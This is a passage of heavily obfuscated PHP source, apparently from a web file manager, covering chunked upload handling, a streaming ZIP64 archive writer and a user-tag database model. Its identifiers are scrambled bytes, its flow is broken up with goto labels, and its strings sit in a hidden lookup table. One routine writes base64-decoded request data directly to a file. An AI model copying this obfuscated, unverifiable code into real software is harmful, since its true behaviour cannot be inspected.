c˜º‡íôæ·; Dô‰·ÅŠ…: return $this->tempFile; goto E½ßáŠĞÆë; b¦¶¶À®°…: $BÅÒ øÀ‡ = $this->tempFile . $c³œõŒõ¬Œ[1350] . $Bğù¦“¼—µ; $B¢ƒºö–ì¤ = isset($this->in[$c³œõŒõ¬Œ[382]]) ? intval($this->in[$c³œõŒõ¬Œ[382]]) : 0; $AùÎ¨šŸÁƒ = isset($this->in[$c³œõŒõ¬Œ[1351]]) ? intval($this->in[$c³œõŒõ¬Œ[1351]]) : 0; goto eñ™‘ˆ°İ‚; aÊñçË··º: if (!$D®Ì·Š·àÈ) { $this->showJson($c³œõŒõ¬Œ[1355] . $Bğù¦“¼—µ, !1); } $d­°–£»°Ğ[$c³œõŒõ¬Œ[1356]] = $fï¾÷×™Ë¶; $d­°–£»°Ğ[$c³œõŒõ¬Œ[1357]][$c³œõŒõ¬Œ[1358] . $Bğù¦“¼—µ] = array($c³œõŒõ¬Œ[1359] => $fÀ½²Íßª‡, $c³œõŒõ¬Œ[761] => $Bğù¦“¼—µ, $c³œõŒõ¬Œ[78] => $B¢ƒºö–ì¤, $c³œõŒõ¬Œ[152] => $D‘İÛ±‘„š); goto Aòº›ùŒ´Ö; E½ßáŠĞÆë: } private function checkSize() { $cª™¤Ú‘ =& $_SERVER[ÍÓÖ€°å]; if (phpBuild64() || $this->in[$cª™¤Ú‘[78]] < PHP_INT_MAX) { return; } show_json(LNG($cª™¤Ú‘[1362]), !1); } private function showJson($f²ñ¾ËÉŒ, $Aš¦½ŒÁ) { CacheLock::unlock($this->tempFile); if (!$Aš¦½ŒÁ) { return show_json($f²ñ¾ËÉŒ, $Aš¦½ŒÁ); } show_json($f²ñ¾ËÉŒ, $Aš¦½ŒÁ); } public function clearData() { $this->statusSet(!1); if (file_exists($this->tempFile)) { @unlink($this->tempFile); return; } } private function tempPathInit() { goto c×‰ìÏö£; BÎõ÷à³¶³: $this->tempFile = $c’§æÏ‡  . $d˜†©†¾ó÷[1365] . md5($D×©Ìá—¡ƒ . $this->in[$d˜†©†¾ó÷[1366]]); goto D…¾›ƒŞÂÃ; EÈòºŸ†Ğé: touch($c’§æÏ‡  . $d˜†©†¾ó÷[1363]); $D×©Ìá—¡ƒ = isset($this->in[$d˜†©†¾ó÷[1364]]) ? $this->in[$d˜†©†¾ó÷[1364]] : !1; if (strlen($D×©Ìá—¡ƒ) < 30) { $D×©Ìá—¡ƒ = md5(USER_ID . $this->in[$d˜†©†¾ó÷[76]] . $this->fileName . $this->in[$d˜†©†¾ó÷[78]]); } goto BÎõ÷à³¶³; c×‰ìÏö£: $d˜†©†¾ó÷ =& $_SERVER[ÍÓÖ€°å]; $c’§æÏ‡  = TEMP_FILES; @mk_dir($c’§æÏ‡ ); goto EÈòºŸ†Ğé; D…¾›ƒŞÂÃ: } private function moveUploadedFile($D‰ÕŞäÚÕ§) { $EÇ—¾–™ ñ =& $_SERVER[ÍÓÖ€°å]; $d®ÂŞ¤¿Òã = $this->uploadFile; if ($d®ÂŞ¤¿Òã == $EÇ—¾–™ ñ[1367]) { @file_put_contents($D‰ÕŞäÚÕ§, base64_decode($_REQUEST[$EÇ—¾–™ ñ[1368]])); } else { if ($d®ÂŞ¤¿Òã == $EÇ—¾–™ ñ[1209]) { $CğÖŒÎ‹±˜ = @fopen($D‰ÕŞäÚÕ§, $EÇ—¾–™ ñ[1135]); $this->writeTo($d®ÂŞ¤¿Òã, $CğÖŒÎ‹±˜, $D‰ÕŞäÚÕ§); } else { if (!move_uploaded_file($d®ÂŞ¤¿Òã, $D‰ÕŞäÚÕ§)) { return !1; } } } return $D‰ÕŞäÚÕ§; } private function writeTo($Aà±ŒáƒªŞ, $dª¿ºÆÂÀÛ, $eæ´‡óØ²­) { goto eá¢¶‘ ê÷; AéŞ¶Ã±ˆ: $cÛççìŠ® = @fopen($Aà±ŒáƒªŞ, $Fùšº ˆ„[1134]); if (!$cÛççìŠ® || !$dª¿ºÆÂÀÛ || !$d“ ‘„ã¢›) { CacheLock::unlock($dïË‘Íğ™ô); return !1; } while (!feof($cÛççìŠ®)) { fwrite($dª¿ºÆÂÀÛ, fread($cÛççìŠ®, 1024 * 200)); } goto dÏ‹ç‚ø¸; eá¢¶‘ ê÷: $Fùšº ˆ„ =& $_SERVER[ÍÓÖ€°å]; $dïË‘Íğ™ô = $Fùšº ˆ„[1369] . $eæ´‡óØ²­; $d“ ‘„ã¢› = CacheLock::lock($dïË‘Íğ™ô, 1); goto AéŞ¶Ã±ˆ; dÏ‹ç‚ø¸: fclose($cÛççìŠ®); fclose($dª¿ºÆÂÀÛ); CacheLock::unlock($dïË‘Íğ™ô); goto A˜™—â‘í; A˜™—â‘í: return !0; goto Eç×Öë›ï©; Eç×Öë›ï©: } private function statusGet() { goto d–’¼èíÎæ; e¦«´›øŒ: if (!$this->statusData) { $CœÔ®…Œé = array($eìËáÑŸÛ [28] => $this->fileName, $eìËáÑŸÛ [1356] => 0, $eìËáÑŸÛ [1357] => array()); $this->statusSet($CœÔ®…Œé); } return $this->statusData; goto Eƒê˜’ˆ; CÂŠŒ÷Úê: $DÀÕŠ˜Š…Ú = !1; if (file_exists($c×ÃìÓ†ô‘)) { $DÀÕŠ˜Š…Ú = @file_get_contents($c×ÃìÓ†ô‘); } if ($DÀÕŠ˜Š…Ú) { $this->statusData = unserialize($DÀÕŠ˜Š…Ú); } goto e¦«´›øŒ; d–’¼èíÎæ: $eìËáÑŸÛ  =& $_SERVER[ÍÓÖ€°å]; if (is_array($this->statusData)) { return $this->statusData; } $c×ÃìÓ†ô‘ = $this->tempFile . $eìËáÑŸÛ [1370]; goto CÂŠŒ÷Úê; Eƒê˜’ˆ: } public function statusSet($bîÏóÒ‘ù¦) { $dÀ´«Ô¼“ = $this->tempFile . $_SERVER[ÍÓÖ€°å][1370]; if (!$bîÏóÒ‘ù¦) { if (file_exists($dÀ´«Ô¼“)) { @unlink($dÀ´«Ô¼“); } return !0; } $this->statusData = $bîÏóÒ‘ù¦; return file_put_contents($dÀ´«Ô¼“, serialize($bîÏóÒ‘ù¦)); } private function initFileTemp() { $bÏ˜§´÷ç =& $_SERVER[ÍÓÖ€°å]; if (file_exists($this->tempFile)) { return; } $bİµŒ‚»ää = fopen($this->tempFile, $bÏ˜§´÷ç[1371]); fseek($bİµŒ‚»ää, $this->in[$bÏ˜§´÷ç[78]] - 1, SEEK_SET); fwrite($bİµŒ‚»ää, $bÏ˜§´÷ç[393]); fclose($bİµŒ‚»ää); } public function checkChunk() { goto dĞé–³„ùÛ; bÊ…†ÎšÒ: return $eÑ†º©®”„; goto eÔŒİ„‘¤½; dĞé–³„ùÛ: $Cø‹ •¢Åç =& $_SERVER[ÍÓÖ€°å]; $eÑ†º©®”„ = array(); CacheLock::lock($this->tempFile); goto C’”“Ã®; C’”“Ã®: $eåèØ›©¼ = $this->statusGet(); CacheLock::unlock($this->tempFile); foreach ($eåèØ›©¼[$Cø‹ •¢Åç[1357]] as $a¬ò´Ñ•Ù) { $a•·õÒå‹Ù = $a¬ò´Ñ•Ù[$Cø‹ •¢Åç[152]]; if ($a•·õÒå‹Ù) { $eÑ†º©®”„[$Cø‹ •¢Åç[1372] . $a¬ò´Ñ•Ù[$Cø‹ •¢Åç[761]]] = $a•·õÒå‹Ù; } } goto bÊ…†ÎšÒ; eÔŒİ„‘¤½: } private function checkChunkHash($A²êÔêÙ…×) { goto cà¿áŒ‚‰; D‘ì¸•÷¯: $fàì«ó›£Ï = _get($this->in, $EäâÈêÈ‚[1373]); if (strlen($fàì«ó›£Ï) == 32 && IO::hashSimple($this->tempFile) == $bšÒÄ’Ê–… && IO::hashMd5($this->tempFile) == $fàì«ó›£Ï) { return !0; } $C‡‘ôÙìˆã = fopen($this->tempFile, $EäâÈêÈ‚[869]); goto DÔ‘•ŠùŸÌ; cà¿áŒ‚‰: $EäâÈêÈ‚ =& $_SERVER[ÍÓÖ€°å]; if (count($A²êÔêÙ…×[$EäâÈêÈ‚[1357]]) != $A²êÔêÙ…×[$EäâÈêÈ‚[1356]]) { return !1; } $bšÒÄ’Ê–… = _get($this->in, $EäâÈêÈ‚[1364]); goto D‘ì¸•÷¯; dœœî²ÆÚÇ: return $c•çì‘ùÙ; goto Bßò÷ù‚åŠ; DÔ‘•ŠùŸÌ: $c•çì‘ùÙ = !0; foreach ($A²êÔêÙ…×[$EäâÈêÈ‚[1357]] as $C”„ªá¥±) { fseek($C‡‘ôÙìˆã, $C”„ªá¥±[$EäâÈêÈ‚[1359]]); $B™È’”˜´ = PathDriverStream::hash($C‡‘ôÙìˆã, $C”„ªá¥±[$EäâÈêÈ‚[78]]); if ($C”„ªá¥±[$EäâÈêÈ‚[152]] != $B™È’”˜´) { $c•çì‘ùÙ = !1; break; } } fclose($C‡‘ôÙìˆã); goto dœœî²ÆÚÇ; Bßò÷ù‚åŠ: } public static function fileName() { goto bÚØĞÚ•ÕË; bÚØĞÚ•ÕË: $d‚¹•ºêÂâ =& $_SERVER[ÍÓÖ€°å]; global $in; $fÀñÛì¿¯¥ = isset($in[$d‚¹•ºêÂâ[28]]) ? $in[$d‚¹•ºêÂâ[28]] : $d‚¹•ºêÂâ[33]; goto A°Ï¶…”œğ; a¹ö¬ ™î±: if ($B£®Ò‹â÷ï == $d‚¹•ºêÂâ[1375] || $B£®Ò‹â÷ï == $d‚¹•ºêÂâ[1376]) { $fÀñÛì¿¯¥ = date($d‚¹•ºêÂâ[438], $eİèÕ†óß) . $d‚¹•ºêÂâ[71] . $in[$d‚¹•ºêÂâ[78]] . $d‚¹•ºêÂâ[1377]; } else { if ($B£®Ò‹â÷ï == $d‚¹•ºêÂâ[1378]) { $fÀñÛì¿¯¥ = date($d‚¹•ºêÂâ[438], $eİèÕ†óß) . $d‚¹•ºêÂâ[71] . $in[$d‚¹•ºêÂâ[78]] . $d‚¹•ºêÂâ[1379]; } } return $fÀñÛì¿¯¥; goto DÕ«ùÆ«‡©; d¥“ª¾¼§à: $eİèÕ†óß = strtotime($in[$d‚¹•ºêÂâ[1374]]); $eİèÕ†óß = $eİèÕ†óß ? $eİèÕ†óß : time(); $B£®Ò‹â÷ï = strtolower($fÀñÛì¿¯¥); goto a¹ö¬ ™î±; A°Ï¶…”œğ: if (!empty($_FILES)) { $fÀñÛì¿¯¥ = $fÀñÛì¿¯¥ ? $fÀñÛì¿¯¥ : $_FILES[$d‚¹•ºêÂâ[155]][$d‚¹•ºêÂâ[378]]; } $fÀñÛì¿¯¥ = str_replace(array($d‚¹•ºêÂâ[92], $d‚¹•ºêÂâ[8]), array($d‚¹•ºêÂâ[8], $d‚¹•ºêÂâ[90]), trim($fÀñÛì¿¯¥)); if (!is_wap()) { return $fÀñÛì¿¯¥; } goto d¥“ª¾¼§à; DÕ«ùÆ«‡©: } private function errorInfo($BæÓé´ªÚ) { $eŒÍ’õ´â =& $_SERVER[ÍÓÖ€°å]; $CÈÂ‹Ğ­¯³ = array($eŒÍ’õ´â[1380], $eŒÍ’õ´â[1381], $eŒÍ’õ´â[1382], $eŒÍ’õ´â[1383], $eŒÍ’õ´â[1384], $eŒÍ’õ´â[1385], $eŒÍ’õ´â[1386], $eŒÍ’õ´â[1387]); return $BæÓé´ªÚ . $eŒÍ’õ´â[4] . $CÈÂ‹Ğ­¯³[$BæÓé´ªÚ]; } } class ZipMake { const VERSION = "\x30\x2e\62\56\60"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($B©ÛºµœÙ = null) { $cƒÙ’Çíš¸ =& $_SERVER[ÍÓÖ€°å]; $this->outputStream = fopen($cƒÙ’Çíš¸[1388], $cƒÙ’Çíš¸[928]); $this->outputName = $B©ÛºµœÙ; $this->needHeaders = !0; } public function addFile($d‡µ¾²¸¿, $A²Âº„÷‹Î) { goto B»ˆæÆ‘ğ®; aæŸ‡„è¾Ÿ: $fèÃÈÛä»Ñ = $this->addFileHeader($d‡µ¾²¸¿, $Eæ°­ëâ©ä); $BÜÛóç¸£ = $Aâ£“´°ƒÅ = filesize($A²Âº„÷‹Î); $F¼Ï…Œ³¥ê = fopen($A²Âº„÷‹Î, $d›¼‹¬ä÷«[1389]); goto fùÌö‚ ®Ş; B»ˆæÆ‘ğ®: $d›¼‹¬ä÷« =& $_SERVER[ÍÓÖ€°å]; $d‡µ¾²¸¿ = $this->filterFilename($d‡µ¾²¸¿); $Eæ°­ëâ©ä = static::METHOD_STORE; goto aæŸ‡„è¾Ÿ; b˜£Š±âœ: $this->addFileFooter($d‡µ¾²¸¿, $Eæ°­ëâ©ä, $aƒŸ«¯¥ÍŠ, $BÜÛóç¸£, $Aâ£“´°ƒÅ, $fèÃÈÛä»Ñ); goto e‘ÄĞ¥Ëñ„; fùÌö‚ ®Ş: while (!feof($F¼Ï…Œ³¥ê)) { $eºÛåŒØªğ = fread($F¼Ï…Œ³¥ê, 1048576); $this->send($eºÛåŒØªğ); } fclose($F¼Ï…Œ³¥ê); $aƒŸ«¯¥ÍŠ = hexdec(hash_file($d›¼‹¬ä÷«[1390], $A²Âº„÷‹Î)); goto b˜£Š±âœ; e‘ÄĞ¥Ëñ„: } public function addFileFromStream($D²°…êÉ¦ä, $a™ìÜé÷Ãì) { goto AÁ­â¢‹Œ¼; e¿ÎÄàÛ³‚: $this->addFileFooter($D²°…êÉ¦ä, $Eºó„ßë‡, $B…ÕÉ£ù¨Ø, $c¢‰ˆÛ“ù, $a³º­³‹šµ, $DåØ›ÃáËŠ); goto E»‹¸„ãˆ; AÁ­â¢‹Œ¼: $D²°…êÉ¦ä = $this->filterFilename($D²°…êÉ¦ä); $Eºó„ßë‡ = static::METHOD_STORE; $DåØ›ÃáËŠ = $this->addFileHeader($D²°…êÉ¦ä, $Eºó„ßë‡); goto e•¸ãññ„; e•¸ãññ„: fseek($a™ìÜé÷Ãì, 0, SEEK_END); $c¢‰ˆÛ“ù = $a³º­³‹šµ = ftell($a™ìÜé÷Ãì); rewind($a™ìÜé÷Ãì); goto FÈ­›Ê¶›; FÈ­›Ê¶›: $FŒ©àËøÄ = hash_init($_SERVER[ÍÓÖ€°å][1390]); while (!feof($a™ìÜé÷Ãì)) { $fë˜±Š°Î¨ = fread($a™ìÜé÷Ãì, 1048576); hash_update($FŒ©àËøÄ, $fë˜±Š°Î¨); $this->send($fë˜±Š°Î¨); } $B…ÕÉ£ù¨Ø = hexdec(hash_final($FŒ©àËøÄ)); goto e¿ÎÄàÛ³‚; E»‹¸„ãˆ: } public function finish() { foreach ($this->files as $bÌğ¥Ò¤Š…) { $this->addCdrFile($bÌğ¥Ò¤Š…); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($B¶‹Úñ†‘à, $aù‡Ú…œá“) { goto F‰Œíæ’; D¸¯ã¼Áˆ: return strlen($eŒ– †‚­æ) + $DÈ·ğÛßËÕ + strlen($Aù§§îÂÇ‘); goto c‰¬ÓÕçö; F‰Œíæ’: $EÂËÎÖ¨ğ¯ =& $_SERVER[ÍÓÖ€°å]; $B¶‹Úñ†‘à = preg_replace($EÂËÎÖ¨ğ¯[1391], $EÂËÎÖ¨ğ¯[33], $B¶‹Úñ†‘à); $DÈ·ğÛßËÕ = strlen($B¶‹Úñ†‘à); goto EàÁ‚±ÀÆÉ; aëî’Ãœ¼£: $eŒ– †‚­æ = $this->packFields($BŞä†£¯ƒ…); $Aù§§îÂÇ‘ = $this->packFields($Eƒ”øÍ®„‡); $this->send($eŒ– †‚­æ . $B¶‹Úñ†‘à . $Aù§§îÂÇ‘); goto D¸¯ã¼Áˆ; EàÁ‚±ÀÆÉ: $Få¹ìÁº = $this->dosTime(time()); $BŞä†£¯ƒ… = array(array($EÂËÎÖ¨ğ¯[1392], static::FILE_HEADER_SIGNATURE), array($EÂËÎÖ¨ğ¯[1393], static::ZIP_VERSION_64), array($EÂËÎÖ¨ğ¯[1393], 8), array($EÂËÎÖ¨ğ¯[1393], $aù‡Ú…œá“), array($EÂËÎÖ¨ğ¯[1392], $Få¹ìÁº), array($EÂËÎÖ¨ğ¯[1392], 0), array($EÂËÎÖ¨ğ¯[1392], 4294967295), array($EÂËÎÖ¨ğ¯[1392], 4294967295), array($EÂËÎÖ¨ğ¯[1393], $DÈ·ğÛßËÕ), array($EÂËÎÖ¨ğ¯[1393], 32)); $Eƒ”øÍ®„‡ = array(array($EÂËÎÖ¨ğ¯[1393], 1), array($EÂËÎÖ¨ğ¯[1393], 28), array($EÂËÎÖ¨ğ¯[1394], 0), array($EÂËÎÖ¨ğ¯[1394], 0), array($EÂËÎÖ¨ğ¯[1394], 0), array($EÂËÎÖ¨ğ¯[1392], 0)); goto aëî’Ãœ¼£; c‰¬ÓÕçö: } protected function addFileFooter($bİŸÜë É£, $cÎª¬šÆÓ…, $bê®»öª, $D¾ŒÑ©Êˆ, $C¸ëÌâç¬Ã, $Dğ¢ìé¹Ò) { $Dïìãƒ—„Ş =& $_SERVER[ÍÓÖ€°å]; $EïëÖ¯”— = array(array($Dïìãƒ—„Ş[1392], static::DATA_DESCRIPTOR_SIGNATURE), array($Dïìãƒ—„Ş[1392], $bê®»öª), array($Dïìãƒ—„Ş[1394], $D¾ŒÑ©Êˆ), array($Dïìãƒ—„Ş[1394], $C¸ëÌâç¬Ã)); $B…ÃÎª«ê¾ = $this->packFields($EïëÖ¯”—); $this->send($B…ÃÎª«ê¾); $C› ‘˜ËÖ = $Dğ¢ìé¹Ò + $D¾ŒÑ©Êˆ + $D×Ì”çµ½ã; $this->addToCdr($bİŸÜë É£, $cÎª¬šÆÓ…, $bê®»öª, $D¾ŒÑ©Êˆ, $C¸ëÌâç¬Ã, $C› ‘˜ËÖ); } private function addToCdr($aÔ„¼ìÀÂ”, $d‹ÂÅ­¬ä, $D±´¤â®‡½, $B†ÂË¥š«³, $e®™…ÌÙ×á, $A…ë†åšï) { $this->files[] = array($aÔ„¼ìÀÂ”, $d‹ÂÅ­¬ä, $D±´¤â®‡½, $B†ÂË¥š«³, $e®™…ÌÙ×á, $this->ofs); $this->ofs += $A…ë†åšï; } protected function addCdrFile($DŞœÑ°áÒø) { goto cğ ĞÁò´Ã; eòˆÒŞÀ‘¾: $eÓï œ­‚³ = $this->dosTime(time()); $f³Ìì¢˜İÀ = array(array($dÀÆôö¹ˆ›[1392], static::CDR_FILE_SIGNATURE), array($dÀÆôö¹ˆ›[1393], static::ZIP_VERSION_64), array($dÀÆôö¹ˆ›[1393], static::ZIP_VERSION_64), array($dÀÆôö¹ˆ›[1393], 8), array($dÀÆôö¹ˆ›[1393], $C†º“â¸¶É), array($dÀÆôö¹ˆ›[1392], $eÓï œ­‚³), array($dÀÆôö¹ˆ›[1392], $f¤’Éƒï·Ä), array($dÀÆôö¹ˆ›[1392], 4294967295), array($dÀÆôö¹ˆ›[1392], 4294967295), array($dÀÆôö¹ˆ›[1393], strlen($B¨ŠœùÍù…)), array($dÀÆôö¹ˆ›[1393], 32), array($dÀÆôö¹ˆ›[1393], strlen($Eõ¶¢“›)), array($dÀÆôö¹ˆ›[1393], 0), array($dÀÆôö¹ˆ›[1393], 0), array($dÀÆôö¹ˆ›[1392], 32), array($dÀÆôö¹ˆ›[1392], 4294967295)); $a³Ñ‚Ÿñ¬ã = array(array($dÀÆôö¹ˆ›[1393], 1), array($dÀÆôö¹ˆ›[1393], 28), array($dÀÆôö¹ˆ›[1394], $Fó´Ë¹ì¥), array($dÀÆôö¹ˆ›[1394], $Fë‹ïÓÂ£¿), array($dÀÆôö¹ˆ›[1394], $e©Œ¯åÆƒÌ), array($dÀÆôö¹ˆ›[1392], 0)); goto FÜ×£Ã‰ÁŠ; FÜ×£Ã‰ÁŠ: $aêÒœâÆŠç = $this->packFields($f³Ìì¢˜İÀ); $A­£Ê¬ÑÓ = $this->packFields($a³Ñ‚Ÿñ¬ã); $D¯ø£ÇÔ”‘ = $aêÒœâÆŠç . $B¨ŠœùÍù… . $Eõ¶¢“› . $A­£Ê¬ÑÓ; goto f‘ï å»; f‘ï å»: $this->send($D¯ø£ÇÔ”‘); $this->cdr_ofs += strlen($D¯ø£ÇÔ”‘); goto A¯Ô¾†ç¹; cğ ĞÁò´Ã: $dÀÆôö¹ˆ› =& $_SERVER[ÍÓÖ€°å]; list($B¨ŠœùÍù…, $C†º“â¸¶É, $f¤’Éƒï·Ä, $Fë‹ïÓÂ£¿, $Fó´Ë¹ì¥, $e©Œ¯åÆƒÌ) = $DŞœÑ°áÒø; $Eõ¶¢“› = $dÀÆôö¹ˆ›[33]; goto eòˆÒŞÀ‘¾; A¯Ô¾†ç¹: } protected function addCdr64Eof() { goto aŞ‹‹ÒÉ¯¦; aŞ‹‹ÒÉ¯¦: $a‚Ì•‹‚Ï  =& $_SERVER[ÍÓÖ€°å]; $a¨«… ò = count($this->files); $c‹Šùİ³™¡ = $this->cdr_ofs; goto dğÎ‡âŒï; CÌæĞ£ç…Ë: $this->send($eÇÂ±ø¡Íí); goto fÄĞ½‡ß‘¶; dğÎ‡âŒï: $aâÙßØêêâ = $this->ofs; $c ‚®¿ßØ“ = array(array($a‚Ì•‹‚Ï [1392], static::ZIP64_CDR_EOF_SIGNATURE), array($a‚Ì•‹‚Ï [1394], 44), array($a‚Ì•‹‚Ï [1393], static::ZIP_VERSION_64), array($a‚Ì•‹‚Ï [1393], static::ZIP_VERSION_64), array($a‚Ì•‹‚Ï [1392], 0), array($a‚Ì•‹‚Ï [1392], 0), array($a‚Ì•‹‚Ï [1394], $a¨«… ò), array($a‚Ì•‹‚Ï [1394], $a¨«… ò), array($a‚Ì•‹‚Ï [1394], $c‹Šùİ³™¡), array($a‚Ì•‹‚Ï [1394], $aâÙßØêêâ)); $eÇÂ±ø¡Íí = $this->packFields($c ‚®¿ßØ“); goto CÌæĞ£ç…Ë; fÄĞ½‡ß‘¶: } protected function addCdr64Locator() { goto DÈÁ…ãŞ; bÀ²˜÷¦ñ: $AÛÊºˆƒ»Ô = $this->ofs; $aâå¡æï¨ = array(array($BŸÏºâœ¤÷[1392], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($BŸÏºâœ¤÷[1392], 0), array($BŸÏºâœ¤÷[1394], $AÛÊºˆƒ»Ô + $cÜ¬Ï¬ºÏ’), array($BŸÏºâœ¤÷[1392], 1)); $cë¤‹°ˆ = $this->packFields($aâå¡æï¨); goto EË»‰³ÇÈ; EË»‰³ÇÈ: $this->send($cë¤‹°ˆ); goto EóšÈ¹‹Í›; DÈÁ…ãŞ: $BŸÏºâœ¤÷ =& $_SERVER[ÍÓÖ€°å]; $C‰ŞÕ®™ = count($this->files); $cÜ¬Ï¬ºÏ’ = $this->cdr_ofs; goto bÀ²˜÷¦ñ; EóšÈ¹‹Í›: } protected function addCdrEof() { goto cÌÊ¿‘÷—è; Fø¾¡æ¤±: $EÊÈ™°Åè— = $this->ofs; $A¬Ú‹ê±¸Ÿ = $CäŞ®µñ™°[33]; $E§·É¯˜…” = array(array($CäŞ®µñ™°[1392], static::CDR_EOF_SIGNATURE), array($CäŞ®µñ™°[1393], 0), array($CäŞ®µñ™°[1393], 0), array($CäŞ®µñ™°[1393], $FµÌ¯å¤Ã¦), array($CäŞ®µñ™°[1393], $FµÌ¯å¤Ã¦), array($CäŞ®µñ™°[1392], 4294967295), array($CäŞ®µñ™°[1392], 4294967295), array($CäŞ®µñ™°[1393], strlen($A¬Ú‹ê±¸Ÿ))); goto A ¥ç™Ë±›; cÌÊ¿‘÷—è: $CäŞ®µñ™° =& $_SERVER[ÍÓÖ€°å]; $FµÌ¯å¤Ã¦ = count($this->files); $càãñëÍÙ§ = $this->cdr_ofs; goto Fø¾¡æ¤±; A ¥ç™Ë±›: $cÑ²¨¡­Š = $this->packFields($E§·É¯˜…”) . $A¬Ú‹ê±¸Ÿ; $this->send($cÑ²¨¡­Š); goto BÇê»´‘×; BÇê»´‘×: } protected function addCdr() { foreach ($this->files as $AØŒõ„è¬¦) { $this->addCdrFile($AØŒõ„è¬¦); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $Eï‡‘Öˆ¿¢ =& $_SERVER[ÍÓÖ€°å]; $b×Ö´ß‰„§ = $Eï‡‘Öˆ¿¢[190]; if ($this->outputName) { $cÃÃˆ§ä ¿ = trim(str_replace(array($Eï‡‘Öˆ¿¢[102], $Eï‡‘Öˆ¿¢[55], $Eï‡‘Öˆ¿¢[92], $Eï‡‘Öˆ¿¢[68], $Eï‡‘Öˆ¿¢[212], $Eï‡‘Öˆ¿¢[477]), $Eï‡‘Öˆ¿¢[33], $this->outputName)); $eó¤¬æ÷¨  = rawurlencode($cÃÃˆ§ä ¿); $b×Ö´ß‰„§ .= "\73\40\x66\151\154\145\x6e\141\155\x65\x2a\75\165\164\146\x2d\70\x27\47{$eó¤¬æ÷¨ }"; } $Aïã¡À±½ = array($Eï‡‘Öˆ¿¢[187] => $Eï‡‘Öˆ¿¢[1395], $Eï‡‘Öˆ¿¢[1396] => $b×Ö´ß‰„§, $Eï‡‘Öˆ¿¢[1397] => $Eï‡‘Öˆ¿¢[1398], $Eï‡‘Öˆ¿¢[1399] => $Eï‡‘Öˆ¿¢[1400], $Eï‡‘Öˆ¿¢[1401] => $Eï‡‘Öˆ¿¢[1402]); foreach ($Aïã¡À±½ as $d‡ö«è¶ä => $c‹Ë—ˆ) { header($d‡ö«è¶ä . $Eï‡‘Öˆ¿¢[635] . $c‹Ë—ˆ); } } protected function send($b…œ„àˆÍ) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $b…œ„àˆÍ); } protected final function dosTime($E¤ñ§ƒàÍ¹) { $EàÙ™œ¤ãÂ =& $_SERVER[ÍÓÖ€°å]; $dà…Ø“å = getdate($E¤ñ§ƒàÍ¹); if ($dà…Ø“å[$EàÙ™œ¤ãÂ[1403]] < 1980) { $dà…Ø“å = array($EàÙ™œ¤ãÂ[1403] => 1980, $EàÙ™œ¤ãÂ[1404] => 1, $EàÙ™œ¤ãÂ[1405] => 1, $EàÙ™œ¤ãÂ[1406] => 0, $EàÙ™œ¤ãÂ[1407] => 0, $EàÙ™œ¤ãÂ[1408] => 0); } $dà…Ø“å[$EàÙ™œ¤ãÂ[1403]] -= 1980; return $dà…Ø“å[$EàÙ™œ¤ãÂ[1403]] << 25 | $dà…Ø“å[$EàÙ™œ¤ãÂ[1404]] << 21 | $dà…Ø“å[$EàÙ™œ¤ãÂ[1405]] << 16 | $dà…Ø“å[$EàÙ™œ¤ãÂ[1406]] << 11 | $dà…Ø“å[$EàÙ™œ¤ãÂ[1407]] << 5 | $dà…Ø“å[$EàÙ™œ¤ãÂ[1408]] >> 1; } protected function packFields($F–ÖçãÎƒÍ) { $AšÏîÅ„Â• =& $_SERVER[ÍÓÖ€°å]; $eö£–¤„Œ² = $AšÏîÅ„Â•[33]; $dâÔ‘–Ó = array(); foreach ($F–ÖçãÎƒÍ as $DÔê†–„“¬) { $eö£–¤„Œ² .= $DÔê†–„“¬[0]; $dâÔ‘–Ó[] = $DÔê†–„“¬[1]; } array_unshift($dâÔ‘–Ó, $eö£–¤„Œ²); return call_user_func_array($AšÏîÅ„Â•[1409], $dâÔ‘–Ó); } protected function filterFilename($bİ–¿ëøìŠ) { $E±ŸôØˆä¯ =& $_SERVER[ÍÓÖ€°å]; return str_replace(array($E±ŸôØˆä¯[92], $E±ŸôØˆä¯[4], $E±ŸôØˆä¯[164], $E±ŸôØˆä¯[70], $E±ŸôØˆä¯[102], $E±ŸôØˆä¯[680], $E±ŸôØˆä¯[683], $E±ŸôØˆä¯[263]), $E±ŸôØˆä¯[71], $bİ–¿ëøìŠ); } } goto B¡Ûç±Œ†¥; dŒÆâ«Øöù: class UserTagSourceModel extends ModelBase { protected $tableName = "\165\x73\145\x72\137\x66\x61\x76"; protected function cacheFunctionAlias($EÆã§¢Æë) { $a¿‡›¸ËÕ¿ =& $_SERVER[ÍÓÖ€°å]; return array($a¿‡›¸ËÕ¿[1869] => array(USER_ID, $a¿‡›¸ËÕ¿[1932])); } protected function listData() { $D×º„ÙÚÔ =& $_SERVER[ÍÓÖ€°å]; $a¼§¯ï¢× = array($D×º„ÙÚÔ[1053] => USER_ID, $D×º„ÙÚÔ[1871] => array($D×º„ÙÚÔ[1933], 0)); $bª²¹¤‹ = $D×º„ÙÚÔ[1934]; $b“Â×ÆÑ = $D×º„ÙÚÔ[1935]; $C™ÕÙ¼ÂÓù = $this->field($bª²¹¤‹)->where($a¼§¯ï¢×)->order($b“Â×ÆÑ)->select(); return $C™ÕÙ¼ÂÓù ? $C™ÕÙ¼ÂÓù : array(); } protected function listByTag($fñˆ²¨·ÕÏ) { } protected function addToTag($cô¾¥ÍˆéË, $F¿Ã¸ö ò) { $D²…¿öã³á =& $_SERVER[ÍÓÖ€°å]; if (!Model($D²…¿öã³á[1703])->listData($F¿Ã¸ö ò) || !Model($D²…¿öã³á[512])->pathInfo($cô¾¥ÍˆéË)) { return !1; } $DØ³­Š£‰ = array($D²…¿öã³á[1053] => USER_ID, $D²…¿öã³á[1871] => $F¿Ã¸ö ò, $D²…¿öã³á[1577] => $cô¾¥ÍˆéË, $D²…¿öã³á[787] => $D²…¿öã³á[949], $D²…¿öã³á[378] => 